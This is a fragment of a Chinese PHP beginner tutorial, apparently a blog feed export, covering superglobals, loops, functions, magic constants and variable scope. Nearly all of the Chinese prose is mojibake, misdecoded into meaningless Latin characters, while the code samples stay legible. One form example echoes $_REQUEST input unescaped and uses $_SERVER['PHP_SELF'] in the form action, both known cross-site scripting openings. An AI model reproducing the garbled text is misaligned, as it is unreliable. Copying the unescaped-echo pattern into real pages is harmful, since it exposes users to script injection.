href="#GLOBALS">ğŸ­</a>$GLOBALS</h4><p>åŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„</p><h4 id="SERVER"><a class="header-anchor" href="#SERVER">ğŸ­</a>$_SERVER</h4><p>åŒ…å«äº†å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ä¿¡æ¯çš„æ•°ç»„ï¼Œæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚</p><h4 id="REQUEST"><a class="header-anchor" href="#REQUEST">ğŸ­</a>$_REQUEST</h4><p>ç”¨äºæ”¶é›†HTMLè¡¨å•æäº¤çš„æ•°æ®ã€‚ä»¥ä¸‹å®ä¾‹æ˜¾ç¤ºäº†ä¸€ä¸ªè¾“å…¥å­—æ®µï¼ˆinputï¼‰åŠæäº¤æŒ‰é’®(submit)çš„è¡¨å•(form)ã€‚ å½“ç”¨æˆ·é€šè¿‡ç‚¹å‡» â€œSubmitâ€ æŒ‰é’®æäº¤è¡¨å•æ•°æ®æ—¶, è¡¨å•æ•°æ®å°†å‘é€è‡³<form>æ ‡ç­¾ä¸­ action å±æ€§ä¸­æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶ã€‚ åœ¨è¿™ä¸ªå®ä¾‹ä¸­ï¼Œæˆ‘ä»¬æŒ‡å®šæ–‡ä»¶æ¥å¤„ç†è¡¨å•æ•°æ®ã€‚å¦‚æœä½ å¸Œæœ›å…¶ä»–çš„PHPæ–‡ä»¶æ¥å¤„ç†è¯¥æ•°æ®ï¼Œä½ å¯ä»¥ä¿®æ”¹è¯¥æŒ‡å®šçš„è„šæœ¬æ–‡ä»¶åã€‚ ç„¶åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¶…çº§å…¨å±€å˜é‡ $_REQUEST æ¥æ”¶é›†è¡¨å•ä¸­çš„ input å­—æ®µæ•°æ®ã€‚</form></p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="xml"> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;</span></span></span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>];<span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><span class="xml">Name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><span class="xml"> </span><span class="php"><span class="hljs-meta">&lt;?php</span> </span><span class="php">$name = $_REQUEST[<span class="hljs-string">&#x27;fname&#x27;</span>]; </span><span class="php"><span class="hljs-keyword">echo</span> $name; </span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><h4 id="POST"><a class="header-anchor" href="#POST">ğŸ­</a>$_POST</h4><p>ç”¨äºæ”¶é›†è¡¨å•æ•°æ®ï¼Œåœ¨HTML formæ ‡ç­¾çš„æŒ‡å®šè¯¥å±æ€§ï¼š&quot;method=â€œpostâ€ã€‚(ç”¨æ³•ä¸ä¸Šè¿°$_REQUESTç±»ä¼¼)</p><h4 id="GET"><a class="header-anchor" href="#GET">ğŸ­</a>$_GET</h4><p>$GET åŒæ ·è¢«å¹¿æ³›åº”ç”¨äºæ”¶é›†è¡¨å•æ•°æ®ï¼Œåœ¨HTML formæ ‡ç­¾çš„æŒ‡å®šè¯¥å±æ€§ï¼š&quot;method=â€œgetâ€ã€‚$_GET ä¹Ÿå¯ä»¥æ”¶é›†URLä¸­å‘é€çš„æ•°æ®ã€‚</p><h2 id="PHP-å¾ªç¯"><a class="header-anchor" href="#PHP-å¾ªç¯">ğŸ­</a>PHP å¾ªç¯</h2><h4 id="while"><a class="header-anchor" href="#while">ğŸ­</a>while</h4><p>åªè¦æŒ‡å®šçš„æ¡ä»¶æˆç«‹ï¼Œåˆ™å¾ªç¯æ‰§è¡Œä»£ç å—ã€‚</p><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> (æ¡ä»¶)&#123;    è¦æ‰§è¡Œçš„ä»£ç ;&#125;</code></pre><p>ä»¥ä¸‹å®ä¾‹å˜é‡ <em>i</em> çš„åˆå§‹å€¼ä¸º 9ã€‚ç„¶ååªè¦ <em>i</em> å°äºæˆ–è€…ç­‰äº 13ï¼Œwhile å¾ªç¯å°†ç»§ç»­è¿è¡Œã€‚å¾ªç¯æ¯è¿è¡Œä¸€æ¬¡ï¼Œ<em>i</em> å°±ä¼šé€’å¢ 1ï¼š</p><pre><code class="hljs php-template"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="php"><span class="hljs-meta">&lt;?php</span></span><span class="php">$i=<span class="hljs-number">9</span>;</span><span class="php"><span class="hljs-keyword">while</span>($i&lt;=<span class="hljs-number">13</span>)</span><span class="php">&#123;</span><span class="php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;The number is &quot;</span> . $i . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><span class="php">    $i++;</span><span class="php">&#125;</span><span class="php"><span class="hljs-meta">?&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><pre><code class="hljs angelscript">The number <span class="hljs-keyword">is</span> <span class="hljs-number">9</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">10</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">11</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">12</span>The number <span class="hljs-keyword">is</span> <span class="hljs-number">13</span></code></pre><h4 id="doâ€¦while-è¯­å¥"><a class="header-anchor" href="#doâ€¦while-è¯­å¥">ğŸ­</a>doâ€¦while è¯­å¥</h4><p>doâ€¦while è¯­å¥æ‰§è¡Œä¸€æ¬¡ä»£ç ï¼Œç„¶åæ£€æŸ¥æ¡ä»¶ï¼Œåªè¦æ¡ä»¶æˆç«‹ï¼Œå°±ä¼šé‡å¤è¿›è¡Œå¾ªç¯ã€‚</p><p>è¯­æ³•å¦‚ä¸‹:</p><pre><code class="hljs gauss"><span class="hljs-keyword">do</span>&#123;    è¦æ‰§è¡Œçš„ä»£ç ;&#125;<span class="hljs-keyword">while</span> (æ¡ä»¶);</code></pre><h4 id="for-å¾ªç¯"><a class="header-anchor" href="#for-å¾ªç¯">ğŸ­</a>for å¾ªç¯</h4><p>for å¾ªç¯ç”¨äºé¢„å…ˆçŸ¥é“è„šæœ¬éœ€è¦è¿è¡Œçš„æ¬¡æ•°çš„æƒ…å†µã€‚</p><p>è¯­æ³•å¦‚ä¸‹ï¼šå…¶ä¸­çš„<strong>åˆå§‹å€¼</strong>å’Œ<strong>å¢é‡</strong>å‚æ•°å¯ä¸ºç©ºæˆ–è€…æœ‰å¤šä¸ªè¡¨è¾¾å¼ï¼ˆç”¨é€—å·åˆ†éš”ï¼‰ã€‚</p><pre><code class="hljs abnf">for (åˆå§‹å€¼<span class="hljs-comment">; æ¡ä»¶; å¢é‡)</span>&#123;    è¦æ‰§è¡Œçš„ä»£ç <span class="hljs-comment">;</span>&#125;</code></pre><p>å®ä¾‹å¦‚ä¸‹:å®šä¹‰ä¸€ä¸ªåˆå§‹å€¼ä¸º i=8çš„å¾ªç¯ï¼Œåªè¦å˜é‡ <strong>i</strong> å°äºæˆ–è€…ç­‰äº 10ï¼Œå¾ªç¯å°†ç»§ç»­è¿è¡Œã€‚å¾ªç¯æ¯è¿è¡Œä¸€æ¬¡ï¼Œå˜é‡ <strong>i</strong> å°±ä¼šé€’å¢ 1ï¼š</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">for</span> ($i=<span class="hljs-number">8</span>; $i&lt;=<span class="hljs-number">10</span>; $i++)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i= &quot;</span> . $i . PHP_EOL;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ç»“æœå¦‚ä¸‹:</p><pre><code class="hljs ini"><span class="hljs-attr">i</span>= <span class="hljs-number">8</span><span class="hljs-attr">i</span>= <span class="hljs-number">9</span><span class="hljs-attr">i</span>= <span class="hljs-number">10</span></code></pre><h4 id="foreach-å¾ªç¯"><a class="header-anchor" href="#foreach-å¾ªç¯">ğŸ­</a>foreach å¾ªç¯</h4><p>foreach å¾ªç¯ç”¨äºéå†æ•°ç»„ã€‚</p><p>è¯­æ³•å¦‚ä¸‹ï¼š</p><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $value)&#123;    è¦æ‰§è¡Œä»£ç ;&#125;</code></pre><p>æ¯è¿›è¡Œä¸€æ¬¡å¾ªç¯ï¼Œå½“å‰æ•°ç»„å…ƒç´ çš„å€¼å°±ä¼šè¢«èµ‹å€¼ç»™ $value å˜é‡ï¼ˆæ•°ç»„æŒ‡é’ˆä¼šé€ä¸€åœ°ç§»åŠ¨ï¼‰ï¼Œåœ¨è¿›è¡Œä¸‹ä¸€æ¬¡å¾ªç¯æ—¶ï¼Œæ‚¨å°†çœ‹åˆ°æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå€¼ã€‚</p><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> ($array <span class="hljs-keyword">as</span> $key =&gt; $value)&#123;    è¦æ‰§è¡Œä»£ç ;&#125;</code></pre><p>è¯­æ³•ä¸ä¸Šé¢ç±»ä¼¼ï¼Œä½†ä¸‹é¢çš„è¯­æ³•ä¸­å…ƒç´ çš„é”®ä¸å€¼éƒ½ä¼šè¢«èµ‹å€¼ç»™ $key å’Œ $value å˜é‡ã€‚</p><h2 id="PHP-å‡½æ•°"><a class="header-anchor" href="#PHP-å‡½æ•°">ğŸ­</a>PHP å‡½æ•°</h2><p>å‡½æ•°æ˜¯é€šè¿‡è°ƒç”¨å‡½æ•°æ¥æ‰§è¡Œçš„,å¯ä»¥åœ¨é¡µé¢çš„ä»»ä½•ä½ç½®è°ƒç”¨å‡½æ•°ã€‚</p><h4 id="åˆ›å»º-PHP-å‡½æ•°"><a class="header-anchor" href="#åˆ›å»º-PHP-å‡½æ•°">ğŸ­</a>åˆ›å»º PHP å‡½æ•°</h4><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">functionName</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// è¦æ‰§è¡Œçš„ä»£ç </span>&#125;<span class="hljs-meta">?&gt;</span></code></pre><ul><li><strong>å‡½æ•°çš„åç§°åº”è¯¥æç¤ºå‡ºå®ƒçš„åŠŸèƒ½</strong></li><li><strong>å‡½æ•°åç§°ä»¥å­—æ¯æˆ–ä¸‹åˆ’çº¿å¼€å¤´ï¼ˆä¸èƒ½ä»¥æ•°å­—å¼€å¤´ï¼‰</strong></li></ul><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write_song</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;wonderful u&quot;</span>;&#125; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;I want to listen to &quot;</span>;write_song();<span class="hljs-meta">?&gt;</span></code></pre><p>ç»“æœä¸º ï¼šI want to listen to wonderful u.</p><h4 id="PHP-å‡½æ•°-æ·»åŠ å‚æ•°"><a class="header-anchor" href="#PHP-å‡½æ•°-æ·»åŠ å‚æ•°">ğŸ­</a>PHP å‡½æ•° - æ·»åŠ å‚æ•°</h4><p>å‚æ•°ç±»ä¼¼å˜é‡,å‚æ•°å°±åœ¨å‡½æ•°åç§°åé¢çš„ä¸€ä¸ªæ‹¬å·å†…æŒ‡å®šã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">idol</span>(<span class="hljs-params">$combination,$punctuation</span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">echo</span> $combination . <span class="hljs-string">&quot; blackpink&quot;</span> . $punctuation . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My first idol is &quot;</span>;idol(<span class="hljs-string">&quot;rose&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My second idol is &quot;</span>;idol(<span class="hljs-string">&quot;lisa&quot;</span>,<span class="hljs-string">&quot;!&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My third idol is &quot;</span>;idol(<span class="hljs-string">&quot;jennie&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My forth idol is &quot;</span>;idol(<span class="hljs-string">&quot;jisoo&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><pre><code class="hljs applescript">My <span class="hljs-keyword">first</span> idol <span class="hljs-keyword">is</span> rose blackpink.My <span class="hljs-keyword">second</span> idol <span class="hljs-keyword">is</span> lisa blackpink!My <span class="hljs-keyword">third</span> idol <span class="hljs-keyword">is</span> jennie blackpink?My forth idol <span class="hljs-keyword">is</span> jisoo blackpink?</code></pre><h2 id="PHP-é­”æœ¯å¸¸é‡"><a class="header-anchor" href="#PHP-é­”æœ¯å¸¸é‡">ğŸ­</a>PHP é­”æœ¯å¸¸é‡</h2><p>é­”æœ¯å¸¸é‡çš„å€¼éšç€å®ƒä»¬åœ¨ä»£ç ä¸­çš„ä½ç½®æ”¹å˜è€Œæ”¹å˜ã€‚é­”æœ¯å¸¸é‡çš„ä¸¤è¾¹éƒ½è¦åŠ ä¸Šä¸¤ä¸ªä¸‹åˆ’çº¿ã€‚</p><h4 id="LINE"><a class="header-anchor" href="#LINE">ğŸ­</a><strong>LINE</strong></h4><p>æ–‡ä»¶ä¸­çš„å½“å‰è¡Œå·ã€‚</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;è¿™æ˜¯ç¬¬ &quot; &#x27;</span>  . <span class="hljs-keyword">__LINE__</span> . <span class="hljs-string">&#x27; &quot; è¡Œ&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>ä»¥ä¸Šå®ä¾‹è¾“å‡ºç»“æœä¸ºï¼š</p><pre><code class="hljs angelscript">è¿™æ˜¯ç¬¬ â€œ <span class="hljs-number">2</span> â€ è¡Œ</code></pre><h4 id="FILE"><a class="header-anchor" href="#FILE">ğŸ­</a><strong>FILE</strong></h4><p>æ–‡ä»¶çš„å®Œæ•´è·¯å¾„å’Œæ–‡ä»¶åã€‚å¦‚æœç”¨åœ¨è¢«åŒ…å«æ–‡ä»¶ä¸­ï¼Œåˆ™è¿”å›è¢«åŒ…å«çš„æ–‡ä»¶åã€‚</p><h4 id="DIR"><a class="header-anchor" href="#DIR">ğŸ­</a><strong>DIR</strong></h4><p>æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚å¦‚æœç”¨åœ¨è¢«åŒ…æ‹¬æ–‡ä»¶ä¸­ï¼Œåˆ™è¿”å›è¢«åŒ…æ‹¬çš„æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•ã€‚</p><p>å®ƒç­‰ä»·äº <strong>FILE</strong>ï¼Œå¦‚æœæ˜¯æ ¹ç›®å½•ï¼Œåˆ™ç›®å½•ä¸­ååŒ…æ‹¬æœ«å°¾çš„æ–œæ ã€‚</p><h4 id="FUNCTION"><a class="header-anchor" href="#FUNCTION">ğŸ­</a><strong>FUNCTION</strong></h4><p>è¿”å›è¯¥å‡½æ•°è¢«å®šä¹‰æ—¶çš„åå­—ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p><h4 id="CLASS"><a class="header-anchor" href="#CLASS">ğŸ­</a><strong>CLASS</strong></h4><p>è¿”å›è¯¥ç±»è¢«å®šä¹‰æ—¶çš„åå­—ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ï¼Œç±»ååŒ…æ‹¬å…¶è¢«å£°æ˜çš„ä½œç”¨åŒºåŸŸã€‚</p><h4 id="METHOD"><a class="header-anchor" href="#METHOD">ğŸ­</a><strong>METHOD</strong></h4><p>è¿”å›è¯¥æ–¹æ³•è¢«å®šä¹‰æ—¶çš„åå­—ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚</p><h4 id="NAMESPACE"><a class="header-anchor" href="#NAMESPACE">ğŸ­</a><strong>NAMESPACE</strong></h4><p>å½“å‰å‘½åç©ºé—´çš„åç§°ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ï¼Œæ­¤å¸¸é‡æ˜¯åœ¨ç¼–è¯‘æ—¶å®šä¹‰çš„ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php(ä¸€)</title>
    <link href="/2020/10/10/php%20(%E4%B8%80)/"/>
    <url>/2020/10/10/php%20(%E4%B8%80)/</url>
    
    <content type="html"><![CDATA[<h1>PHPï¼ˆä¸€ï¼‰</h1><ul><li><p>PHPï¼ˆå…¨ç§°ï¼šPHPï¼šHypertext Preprocessorï¼Œå³&quot;PHPï¼šè¶…æ–‡æœ¬é¢„å¤„ç†å™¨&quot;ï¼‰æ˜¯ä¸€ç§é€šç”¨å¼€æºè„šæœ¬è¯­è¨€ã€‚</p></li><li><p>PHP æ–‡ä»¶å¯åŒ…å«æ–‡æœ¬ã€HTMLã€JavaScriptä»£ç å’Œ PHP ä»£ç </p></li><li><p>PHP ä»£ç åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œï¼Œç»“æœä»¥çº¯ HTML å½¢å¼è¿”å›ç»™æµè§ˆå™¨</p></li><li><p>PHP æ–‡ä»¶çš„é»˜è®¤æ–‡ä»¶æ‰©å±•åæ˜¯ â€œ.phpâ€</p></li><li><p><a href="#php%E4%B8%80">PHPï¼ˆä¸€ï¼‰</a></p><ul><li><a href="#%E5%8F%98%E9%87%8F">å˜é‡</a><ul><li><a href="#php-%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F">PHP å˜é‡ä½œç”¨åŸŸ</a><ul><li><a href="#global%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Global:å…¨å±€å˜é‡ä½œç”¨åŸŸ</strong></a></li><li><a href="#static-%E9%9D%99%E6%80%81%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>Static :é™æ€ä½œç”¨åŸŸ</strong></a></li><li><a href="#local%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>local:å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸ</strong></a></li><li><a href="#parameter%E5%8F%82%E6%95%B0%E4%BD%9C%E7%94%A8%E5%9F%9F"><strong>parameterï¼šå‚æ•°ä½œç”¨åŸŸ</strong></a></li></ul></li></ul></li><li><a href="#php-echo-%E5%92%8C-print-%E8%AF%AD%E5%8F%A5">PHP echo å’Œ print è¯­å¥</a></li><li><a href="#php-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">PHP  æ•°æ®ç±»å‹</a><ul><li><a href="#php-%E5%AD%97%E7%AC%A6%E4%B8%B2string">PHP å­—ç¬¦ä¸²(string)</a></li><li><a href="#php-%E5%B9%B6%E7%BD%AE%E8%BF%90%E7%AE%97%E7%AC%A6">PHP å¹¶ç½®è¿ç®—ç¬¦</a></li><li><a href="#php-%E6%95%B4%E5%9E%8Binteger">PHP æ•´å‹(Integer)</a></li><li><a href="#php-%E6%B5%AE%E7%82%B9%E5%9E%8Bfloat">PHP æµ®ç‚¹å‹ï¼ˆfloatï¼‰</a></li><li><a href="#php-%E5%B8%83%E5%B0%94%E5%9E%8B-boolean">PHP å¸ƒå°”å‹( Boolean)</a></li><li><a href="#php-%E6%95%B0%E7%BB%84array">PHP æ•°ç»„(array)</a></li><li><a href="#php-%E5%AF%B9%E8%B1%A1">PHP å¯¹è±¡</a></li><li><a href="#php-null-%E5%80%BC">PHP NULL å€¼</a></li></ul></li><li><a href="#php-%E5%B8%B8%E9%87%8F">PHP å¸¸é‡</a><ul><li><a href="#%E8%AE%BE%E7%BD%AE-php-%E5%B8%B8%E9%87%8F">è®¾ç½® PHP å¸¸é‡</a></li><li><a href="#php-strlen-%E5%87%BD%E6%95%B0">PHP strlen() å‡½æ•°</a></li><li><a href="#php-strpos-%E5%87%BD%E6%95%B0">PHP strpos() å‡½æ•°</a></li></ul></li></ul></li></ul><h2 id="å˜é‡"><a class="header-anchor" href="#å˜é‡">ğŸ­</a>å˜é‡</h2><p>å˜é‡æ˜¯ç”¨äºå­˜å‚¨ä¿¡æ¯çš„&quot;å®¹å™¨&quot;ã€‚ï¼ˆphpä¸Cè¯­è¨€æ¯”è¾ƒç±»ä¼¼ï¼‰</p><ul><li>å˜é‡ä»¥ $ ç¬¦å·å¼€å§‹ï¼Œåé¢è·Ÿç€å˜é‡çš„åç§°</li><li><strong>å˜é‡åå¿…é¡»ä»¥å­—æ¯æˆ–è€…ä¸‹åˆ’çº¿å­—ç¬¦å¼€å§‹</strong></li><li>å˜é‡ååªèƒ½åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ä»¥åŠä¸‹åˆ’çº¿ï¼ˆA-zã€0-9 å’Œ _ ï¼‰</li><li>å˜é‡åä¸èƒ½åŒ…å«ç©ºæ ¼</li><li>å˜é‡åå’Œè¯­å¥éƒ½æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼ˆ$y å’Œ $Y æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ï¼‰</li><li>èµ‹ä¸€ä¸ªæ–‡æœ¬å€¼ç»™å˜é‡æ—¶ï¼Œéœ€åœ¨æ–‡æœ¬å€¼ä¸¤ä¾§åŠ ä¸Šå¼•å·ã€‚</li></ul><h3 id="PHP-å˜é‡ä½œç”¨åŸŸ"><a class="header-anchor" href="#PHP-å˜é‡ä½œç”¨åŸŸ">ğŸ­</a>PHP å˜é‡ä½œç”¨åŸŸ</h3><p>å˜é‡çš„ä½œç”¨åŸŸæ˜¯è„šæœ¬ä¸­å˜é‡å¯è¢«å¼•ç”¨/ä½¿ç”¨çš„éƒ¨åˆ†ã€‚</p><h5 id="Global-å…¨å±€å˜é‡ä½œç”¨åŸŸ"><a class="header-anchor" href="#Global-å…¨å±€å˜é‡ä½œç”¨åŸŸ">ğŸ­</a><strong>Global:å…¨å±€å˜é‡ä½œç”¨åŸŸ</strong></h5><p>é™¤äº†å‡½æ•°å¤–ï¼Œå…¨å±€å˜é‡(å³åœ¨å‡½æ•°å¤–å£°æ˜ï¼Œæ— æ³•åœ¨å‡½æ•°å†…å£°æ˜çš„å˜é‡ã€‚åŒç†:åœ¨å‡½æ•°å†…å£°æ˜,æ— æ³•åœ¨å‡½æ•°å¤–å£°æ˜çš„å˜é‡ä¸ºå±€éƒ¨å˜é‡ã€‚**å› æ­¤å¯ä»¥åœ¨ä¸åŒå‡½æ•°ä¸­ä½¿ç”¨ç›¸åŒçš„å˜é‡åç§°ï¼Œå› ä¸ºè¿™äº›å‡½æ•°å†…å®šä¹‰çš„å˜é‡åæ˜¯å±€éƒ¨å˜é‡ï¼Œåªä½œç”¨äºè¯¥å‡½æ•°å†…ã€‚**å…³äºå±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡çš„ä¼˜å…ˆçº§ï¼Œå› ä¸ºåœ¨PHPä¸­å‡½æ•°éƒ½æœ‰è‡ªå·±å•ç‹¬çš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥åœ¨å±€éƒ¨å˜é‡çš„ä¼˜å…ˆçº§è¦å¤§äºå…¨å±€å˜é‡ï¼ˆåœ¨ä½ ä¸å£°æ˜è¿™ä¸ªå˜é‡ä¹‹å‰ï¼‰ï¼Œå£°æ˜ä¹‹åæ­¤å˜é‡å°±å˜æˆäº†å±€éƒ¨å˜é‡å¦‚æœä¿®æ”¹å€¼é‚£ä¹ˆå…¨å±€å˜é‡çš„å€¼ä¹Ÿä¼šæ”¹å˜ã€‚)å¯ä»¥è¢«è„šæœ¬ä¸­çš„ä»»ä½•éƒ¨åˆ†è®¿é—®ï¼Œè¦åœ¨ä¸€ä¸ªå‡½æ•°ä¸­è®¿é—®ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œéœ€è¦ä½¿ç”¨ global å…³é”®å­—ã€‚</p><p>åœ¨æºä»£ç ä¸­ï¼Œglobal $x,$y;    $y=$x+$y; å’Œ $GLOBALS[â€˜yâ€™]=$GLOBALS[â€˜xâ€™]+$GLOBALS[â€˜yâ€™]; æ˜¯ç­‰æ•ˆçš„ã€‚</p><h5 id="Static-é™æ€ä½œç”¨åŸŸ"><a class="header-anchor" href="#Static-é™æ€ä½œç”¨åŸŸ">ğŸ­</a><strong>Static :é™æ€ä½œç”¨åŸŸ</strong></h5><p>å½“ä¸€ä¸ªå‡½æ•°å®Œæˆæ—¶ï¼Œå®ƒçš„æ‰€æœ‰å˜é‡é€šå¸¸éƒ½ä¼šè¢«åˆ é™¤ã€‚ä½†æœ‰æ—¶å€™æ‚¨å¸Œæœ›æŸä¸ªå±€éƒ¨å˜é‡ä¸è¦è¢«åˆ é™¤å¯ä»¥åœ¨æ‚¨ç¬¬ä¸€æ¬¡å£°æ˜å˜é‡æ—¶ä½¿ç”¨ <strong>static</strong> å…³é”®å­—ã€‚æ¯æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œè¯¥å˜é‡å°†ä¼šä¿ç•™ç€å‡½æ•°å‰ä¸€æ¬¡è¢«è°ƒç”¨æ—¶çš„å€¼ã€‚</p><h5 id="local-å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸ"><a class="header-anchor" href="#local-å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸ">ğŸ­</a><strong>local:å±€éƒ¨å˜é‡çš„ä½œç”¨åŸŸ</strong></h5><p>åœ¨ PHP å‡½æ•°å†…éƒ¨å£°æ˜çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼Œä»…èƒ½åœ¨å‡½æ•°å†…éƒ¨è®¿é—®ã€‚</p><h5 id="parameterï¼šå‚æ•°ä½œç”¨åŸŸ"><a class="header-anchor" href="#parameterï¼šå‚æ•°ä½œç”¨åŸŸ">ğŸ­</a><strong>parameterï¼šå‚æ•°ä½œç”¨åŸŸ</strong></h5><p>å‚æ•°æ˜¯é€šè¿‡è°ƒç”¨ä»£ç å°†å€¼ä¼ é€’ç»™å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><h2 id="PHP-echo-å’Œ-print-è¯­å¥"><a class="header-anchor" href="#PHP-echo-å’Œ-print-è¯­å¥">ğŸ­</a>PHP echo å’Œ print è¯­å¥</h2><ul><li>echo - å¯ä»¥è¾“å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ä¸²(å­—ç¬¦ä¸²å¯ä»¥åŒ…å« HTML æ ‡ç­¾)</li><li>print - åªå…è®¸è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›å€¼æ€»ä¸º 1</li><li>echo è¾“å‡ºçš„é€Ÿåº¦æ¯” print å¿«ï¼Œ echo æ²¡æœ‰è¿”å›å€¼ï¼Œprintæœ‰è¿”å›å€¼1ã€‚</li></ul><h2 id="PHP-æ•°æ®ç±»å‹"><a class="header-anchor" href="#PHP-æ•°æ®ç±»å‹">ğŸ­</a>PHP  æ•°æ®ç±»å‹</h2><h4 id="PHP-å­—ç¬¦ä¸²-string"><a class="header-anchor" href="#PHP-å­—ç¬¦ä¸²-string">ğŸ­</a>PHP 